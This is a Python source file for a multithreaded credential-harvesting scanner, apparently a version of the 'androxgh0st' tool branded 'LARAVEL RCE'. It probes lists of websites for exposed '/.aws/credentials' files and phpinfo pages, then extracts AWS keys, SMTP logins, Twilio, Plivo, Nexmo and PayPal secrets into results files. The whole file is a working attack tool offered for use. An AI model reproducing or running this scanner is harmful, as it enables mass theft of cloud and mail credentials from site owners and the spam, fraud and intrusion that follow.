# -*- coding: utf-8 -*-
import bs4
from queue import Queue
from configparser import ConfigParser
from threading import Thread
from threading import *
import requests
import os
import sys

try:
    from urllib.parse import urlparse
except:
    from urlparse import urlparse

import re
from re import findall as reg
requests.packages.urllib3.disable_warnings()

try:
    os.mkdir('Results')
except:
    pass

list_region = '''us-east-1
us-east-2
us-west-1
us-west-2
af-south-1
ap-east-1
ap-south-1
ap-northeast-1
ap-northeast-2
ap-northeast-3
ap-southeast-1
ap-southeast-2
ca-central-1
eu-central-1
eu-west-1
eu-west-2
eu-west-3
eu-south-1
eu-north-1
me-south-1
sa-east-1'''
pid_restore = '.nero_swallowtail'


class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                print(e)
            self.tasks.task_done()


class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()


def get_value(s, text):
    soup = bs4.BeautifulSoup(text, "html.parser")
    found = soup.find(text=re.compile(r"\s*%s\s*" % s))
    return found.findNext(text=True).string


class androxgh0st:
    def paypal(self, text, url):
        if "PAYPAL_" in text:
            save = open('Results/paypal_sandbox.txt', 'a')
            save.write(url+'\n')
            save.close()
            return True
        else:
            return False

    def get_aws_region(self, text):
        reg = False
        for region in list_region.splitlines():
            if str(region) in text:
                return region
                break

    def get_aws_data(self, text, url):
        try:
            method = urlparse(url).path

            r = {}
            dat = {
              "\n(?:aws_access_key_id|SES_KEY)=(.*?)\n": "AWS ACCESS KEY",
              "\n(?:aws_secret_access_key|SES_SECRET)=(.*?)\n": "AWS SECRET KEY",
              "\nAWS_BUCKET=(.*?)\n": "AWS BUCKET"
            }
            dat2 = {
              "S3_KEY": "AWS ACCESS KEY",
              "S3_SECRET": "AWS SECRET KEY",

              "SNS_KEY": "AWS ACCESS KEY",
              "SNS_SECRET": "AWS SECRET KEY",

              "SQS_KEY": "AWS ACCESS KEY",
              "SQS_SECRET": "AWS SECRET KEY",

              "SES_KEY": "AWS ACCESS KEY",
              "SES_SECRET": "AWS SECRET KEY",

              "AWS_KEY_ID": "AWS ACCESS KEY",
              "AWS_SECRET_ACCESS_KEY": "AWS SECRET KEY",

              "AWS_BUCKET": "AWS BUCKET"
            }
            dat3 = ("S3_REGION", "SNS_REGION", "SQS_REGION")

            aws_reg = None
            for gion in dat3:
                try:
                    aws_reg = get_value(gion, text)
                except: pass
            if not aws_reg:
             aws_reg = self.get_aws_region(text)

            for k, v in dat.items():
                try:
                    r.setdefault(v, reg(k, text)[0])
                except Exception as e:
                    pass

            for k, v in dat2.items():
                try:
                    r.setdefault(v, get_value(k, text))
                except Exception as e:
                    pass

            for v in dat.values():
                r.setdefault(v, "")

            if aws_reg == "":
                aws_reg = "aws_unknown_region--"
            if r["AWS ACCESS KEY"] == "" and r["AWS SECRET KEY"] == "":
                return False


            else:
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\n'
                build += "\n".join("{}: {}".format(*i) for i in r.items())
                remover = str(build).replace('\r', '')

                save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                remover = str(build).replace('\r', '')
                save2 = open('Results/aws_access_key_secret.txt', 'a')
                save2.write(remover+'\n\n')
                save2.close()

            return True
        except:
          raise

    def get_twillio(self, text, url):
        try:
            if "TWILIO" in text:
                if "TWILIO_ACCOUNT_SID=" in text:
                    method = '/.aws/credentials'
                    try:
                        acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
                    except:
                        acc_sid = ''
                    try:
                        acc_key = reg('\nTWILIO_API_KEY=(.*?)\n', text)[0]
                    except:
                        acc_key = ''
                    try:
                        sec = reg('\nTWILIO_API_SECRET=(.*?)\n', text)[0]
                    except:
                        sec = ''
                    try:
                        chatid = reg(
                            '\nTWILIO_CHAT_SERVICE_SID=(.*?)\n', text)[0]
                    except:
                        chatid = ''
                    try:
                        phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
                    except:
                        phone = ''
                    try:
                        auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]
                    except:
                        auhtoken = ''
                else:
                    method = 'phpinfo'
                    try:
                        acc_sid = get_value("TWILIO_ACCOUNT_SID", text)
                    except:
                        acc_sid = ''
                    try:
                        acc_key = get_value("TWILIO_API_KEY", text)
                    except:
                        acc_key = ''
                    try:
                        sec = get_value("TWILIO_API_SECRET", text)
                    except:
                        sec = ''
                    try:
                        chatid = get_value("TWILIO_CHAT_SERVICE_SID", text)
                    except:
                        chatid = ''
                    try:
                        phone = get_value("TWILIO_NUMBER", text)
                    except:
                        phone = ''
                    try:
                        auhtoken = get_value("TWILIO_AUTH_TOKEN",  text)
                    except:
                        auhtoken = ''
                if not acc_key:
                    return False
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(
                    sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
                remover = str(build).replace('\r', '')
                save = open('Results/TWILLIO.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            else:
                return False
        except:
            return False


    def get_PLIVO_data(self, text, url):
        try:
            method = urlparse(url).path

            d = {}
            for x in ("PLIVO_AUTH_ID", "PLIVO_AUTH_TOKEN", "PLIVO_APP_ID"):
                try:
                    d[x] = get_value(x, text)
                except: continue

            if d:
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\n'
                build += "\n".join("{}: {}".format(*i) for i in d.items())
                remover = str(build).replace('\r', '')
                save = open('Results/PLIVO.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
        except:
            return False

    def get_nexmo_data(self, text, url):
        try:
            method = urlparse(url).path

            d = {}
            for x in ("NEXMO_KEY", "NEXMO_SECRET", "NEXMO_FROM"):
                try:
                    d[x] = get_value(x, text)
                except: pass

            if d:
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\n'
                build += "\n".join("{}: {}".format(*i) for i in d.items())
                remover = str(build).replace('\r', '')
                save = open('Results/NEXMO.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
        except:
            return False

    def get_smtp(self, text, url):
        try:
            if "MAIL_HOST" in text:
                if "MAIL_HOST=" in text:
                    method = '/.aws/credentials'
                    mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
                    mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("\MAIL_FROM_NAME=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                else:
                    method = 'phpinfo'
                    mailhost = get_value(
                        'MAIL_HOST', text)
                    mailport = get_value(
                        'MAIL_PORT', text)
                    mailuser = get_value(
                        'MAIL_USERNAME', text)
                    mailpass = get_value(
                        'MAIL_PASSWORD', text)
                    try:
                        mailfrom = get_value(
                            "MAIL_FROM_ADDRESS", text)
                    except:
                        mailfrom = ''
                    try:
                        fromname = get_value(
                            "MAIL_FROM_NAME", text)
                    except:
                        fromname = ''
                if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
                    return False
                else:
                    # mod aws
                    if '.amazonaws.com' in mailhost:
                        getcountry = reg(
                            'email-smtp.(.*?).amazonaws.com', mailhost)[0]
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(
                            mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results/'+getcountry[:-2]+'.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                        remover = str(build).replace('\r', '')
                        save2 = open('Results/smtp_aws.txt', 'a')
                        save2.write(remover+'\n\n')
                        save2.close()
                    elif 'sendgrid' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(
                            mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results/sendgrid.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'office365' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(
                            mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results/office.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif '1and1' in mailhost or '1und1' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(
                            mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results/1and1.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'zoho' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(
                            mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results/zoho.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'mandrillapp' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(
                            mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results/mandrill.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    elif 'mailgun' in mailhost:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(
                            mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results/mailgun.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    else:
                        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(
                            mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_RANDOM.txt', 'a')
                        save.write(remover+'\n\n')
                        save.close()
                    return True
            else:
                return False
        except:
            return False


def printf(text):
    ''.join([str(item) for item in text])
    print((text + '\n'), end=' ')


def main(url):
    resp = False
    try:
        text = '\033[32;1m#\033[0m '+url

        prse = urlparse(url)
        net = "%s://%s" % (
            "http" if not prse.scheme else prse.scheme,
            prse.netloc or url.split("/")[0]
        )
        headers = {
            'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}

        r = requests.get(net+"/.aws/credentials", headers=headers,
                                  timeout=5, verify=False, allow_redirects=False)
        get_source = r.text
        if "aws_access_key_id=" in get_source:
            resp = get_source
        else:
            for path in ("/phpinfo", "/phpinfo.php", "/info.php"):
                r = requests.get(
                    net + path, headers=headers, timeout=5, verify=False, allow_redirects=True)
                get_source = r.text
                if "APP_KEY" in get_source:
                    resp = get_source
                    break
        if resp:
            getsmtp = androxgh0st().get_smtp(resp, url)
            getwtilio = androxgh0st().get_twillio(resp, url)
            getaws = androxgh0st().get_aws_data(resp, r.url)
            getpp = androxgh0st().paypal(resp, url)
            getPLIVO = androxgh0st().get_PLIVO_data(resp, r.url)
            getnexmo = androxgh0st().get_nexmo_data(resp, r.url)

            if getnexmo:
                text += ' | \033[32;1mNEXMO\033[0m'
            else:
                text += ' | \033[31;1mNEXMO\033[0m'
            if getPLIVO:
                text += ' | \033[32;1mPLIVO\033[0m'
            else:
                text += ' | \033[31;1mPLIVO\033[0m'
            if getsmtp:
                text += ' | \033[32;1mSMTP\033[0m'
            else:
                text += ' | \033[31;1mSMTP\033[0m'
            if getaws:
                text += ' | \033[32;1mAWS\033[0m'
            else:
                text += ' | \033[31;1mAWS\033[0m'
            if getwtilio:
                text += ' | \033[32;1mTWILIO\033[0m'
            else:
                text += ' | \033[31;1mTWILIO\033[0m'
            if getpp:
                text += ' | \033[32;1mPAYPAL\033[0m'
            else:
                text += ' | \033[31;1mPAYPAL\033[0m'
        else:
            text += ' | \033[31;1mCan\'t get everything\033[0m'
            save = open('Results/not_vulnerable.txt', 'a')
            asu = str(url).replace('\r', '')
            save.write(asu+'\n')
            save.close()
    except:
        raise
        text = '\033[31;1m#\033[0m '+url
        text += ' | \033[31;1mCan\'t access sites\033[0m'
        save = open('Results/not_vulnerable.txt', 'a')
        asu = str(url).replace('\r', '')
        save.write(asu+'\n')
        save.close()
    printf(text)


if __name__ == '__main__':
    print('''
   ________	_ __  ____		   
  / ____/ /_  (_) /_/ __ \____ ____ 
 / /   / __ \/ / __/ / / / __ `/ _ \\
/ /___/ / / / / /_/ /_/ / /_/ /  __/
\____/_/ /_/_/\__/\____/\__, /\___/ 
	LARAVEL \033[32;1mRCE\033[0m V6.9   /____/	   \n''')
    try:
        readcfg = ConfigParser()
        readcfg.read(pid_restore)
        lists = readcfg.get('DB', 'FILES')
        numthread = readcfg.get('DB', 'THREAD')
        sessi = readcfg.get('DB', 'SESSION')
        print("log session bot found! restore session")
        print(('''Using Configuration :\n\tFILES='''+lists +
              '''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi))
        tanya = input("Want to contineu session ? [Y/n] ")
        if "Y" in tanya or "y" in tanya:
            lerr = open(lists).read().split("\n"+sessi)[1]
            readsplit = lerr.splitlines()
        else:
            kntl  # Send Error Biar Lanjut Ke Wxception :v
    except:
        try:
            lists = sys.argv[1]
            numthread = sys.argv[2]
            readsplit = open(lists).read().splitlines()
        except:
            try:
                lists = input("websitelist ? ")
                readsplit = open(lists).read().splitlines()
            except:
                print("Wrong input or list not found!")
                exit()
            try:
                numthread = input("threads ? ")
            except:
                print("Wrong thread number!")
                exit()
    pool = ThreadPool(int(numthread))
    for url in readsplit:
        if "://" in url:
            url = url
        else:
            url = "http://"+url
        if url.endswith('/'):
            url = url[:-1]
        jagases = url
        try:
            pool.add_task(main, url)
        except KeyboardInterrupt:
            session = open(pid_restore, 'w')
            cfgsession = "[DB]\nFILES="+lists+"\nTHREAD=" + \
                str(numthread)+"\nSESSION="+jagases+"\n"
            session.write(cfgsession)
            session.close()
            print("CTRL+C Detect, Session saved")
            exit()
    pool.wait_completion()
    try:
        os.remove(pid_restore)
    except:
        pass
